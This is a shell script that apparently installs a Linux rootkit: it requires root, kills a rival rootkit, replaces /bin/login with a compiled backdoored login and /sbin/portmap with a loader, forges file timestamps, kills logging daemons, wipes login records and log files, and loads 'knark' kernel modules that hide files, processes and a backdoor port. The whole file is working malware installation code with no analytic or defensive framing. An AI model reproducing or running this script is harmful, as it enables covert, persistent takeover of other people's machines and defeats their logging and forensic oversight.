#!/bin/sh

TORNDIR=/usr/src/.puta
THEPASS=abc
DITTPORT=$1
THEDIR=/usr/lib/$THEPASS

if ! test "$(whoami)" = "root"; then
  exit 1
fi

if test -d "$TORNDIR"; then
  killall -9 in.inetd
  killall -9 t0rntd
  echo "$RANDOMdecryptThisT0rn :D" > /etc/ttyhash
  echo "" > /usr/sbin/in.inetd
  echo "ap" > $TORNDIR/.1file
  echo "255.255" > $TORNDIR/.1addr
  echo "255.255" > $TORNDIR/.1logz
  echo "ap" > $TORNDIR/.1proc
fi

if ! test -d "/usr/include"; then
  mkdir /usr/include
fi

if ! test -d "/usr/include/pwdb"; then
  mkdir /usr/include/pwdb
fi

mkdir $THEDIR
if test -d "$THEDIR"; then
  :
else
  exit 1
fi

cd src
echo "#define MAGIC_WORD \"$THEPASS\"" > kokain.h
echo "#define MAGIC_DIR  \"$THEDIR\"" >> kokain.h

gcc -O2 cobolt.c -o cobolt
if test -r "./cobolt"; then
    :
else
  exit 1
fi
touch -acmr /bin/login cobolt
cp /bin/login $THEDIR/login1
cp cobolt $THEDIR/login2

gcc -O2 autoexec.c -o autoexec
if test -r "./autoexec"; then
  :
else
  exit 1
fi

touch -acmr /sbin/portmap autoexec
cp /sbin/portmap $THEDIR/portmap
rm -f /sbin/portmap
cp autoexec /sbin/portmap
echo "#!/bin/sh" > $THEDIR/autoexec
cd ..

killall -9 syslogd klogd
./wipe u root >/dev/null 2>&1
rm -f /var/log/messages /var/log/secure
cp /var/log/messages.1 /var/log/messages >/dev/null 2>&1
cp /var/log/secure.1 /var/log/secure >/dev/null 2>&1
cp /var/log/messages.0 /var/log/messages >/dev/null 2>&1
cp /var/log/secure.0 /var/log/secure >/dev/null 2>&1

./bpatch ./dittrich __PATCHPort__ $DITTPORT

cat <<E0F>> $THEDIR/.bashrc
alias ls="ls --color -alF"
alias dir="dir --color"
export PS1="\u@\h:\w# "
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/X11R6/bin:$THEDIR:$THEDIR/stuff
cd
E0F
cp -R dittrich stuff $THEDIR
mkdir $THEDIR/knrk
cd knark
make >/dev/null 2>&1
cd ..
rm -rf knark/knrksrc knark/Makefile
cp -R knark/* $THEDIR/knrk
echo "/sbin/insmod -f $THEDIR/knrk/knrk.o" >> $THEDIR/autoexec
echo "/sbin/insmod -f $THEDIR/knrk/knrkmodhide.o" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrkhidef $THEDIR" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrkered /bin/login $THEDIR/login2" >> $THEDIR/autoexec
echo "$THEDIR/knrk/knrknethide \":`./tohex $DITTPORT`\"" >> $THEDIR/autoexec 
echo "$THEDIR/dittrich" >> $THEDIR/autoexec
echo "killall -31 dittrich" >> $THEDIR/autoexec
/sbin/portmap >/dev/null 2>&1
if test -d "/var/named/ADMROCKS"; then
  rm -rf /var/named/ADMROCKS
fi
cat /etc/inetd.conf | grep -v "2222" > /tmp/blahah
rm -f /etc/inetd.conf
cp /tmp/blahah /etc/inetd.conf
rm -f /tmp/blahah
PATH=/sbin:$PATH
syslogd
klogd
cd ..
rm -rf *kokain*
if test -d "/proc/$THEPASS";
then
  :
else
  cp $THEDIR/login2 /bin/login
fi
# - EoF - #